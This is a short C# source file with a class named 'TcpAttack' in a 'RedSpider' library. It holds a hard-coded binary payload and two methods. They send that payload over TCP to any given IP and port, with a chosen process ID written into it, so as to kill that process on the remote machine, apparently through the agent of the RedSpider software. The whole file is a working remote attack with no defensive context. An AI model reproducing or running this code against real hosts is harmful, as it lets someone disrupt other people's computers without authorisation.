using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace T4CLLibrary.RedSpider
{
    public static class TcpAttack
    {
        static readonly byte[] killProcessPayload = { 0x20, 0x84, 0x0, 0x0, 0x1c, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xe, 0x0, 0x0, 0x0, 0xe0, 0x3, 0x0, 0x0, 0x00/*PID低位*/, 0x00/*PID高位*/, 0x0, 0x0 };
        public static void SendTcpPacket(string ip, int port, byte[] data)
        {
            using (var tcpClient = new TcpClient(ip, port))
            {
                var stream = tcpClient.GetStream();
                stream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// 发送结束进程数据包
        /// </summary>
        /// <param name="ip">IP地址</param>
        /// <param name="port">端口</param>
        /// <param name="pid">进程ID</param>
        public static void SendKillProcessPacket(string ip, int port, int pid)
        {
            byte[] payload = (byte[])killProcessPayload.Clone();
            payload[24] = (byte)(pid & 0xFF); // PID低位
            payload[25] = (byte)((pid >> 8) & 0xFF); // PID高位
            SendTcpPacket(ip, port, payload);
        }
    }
}
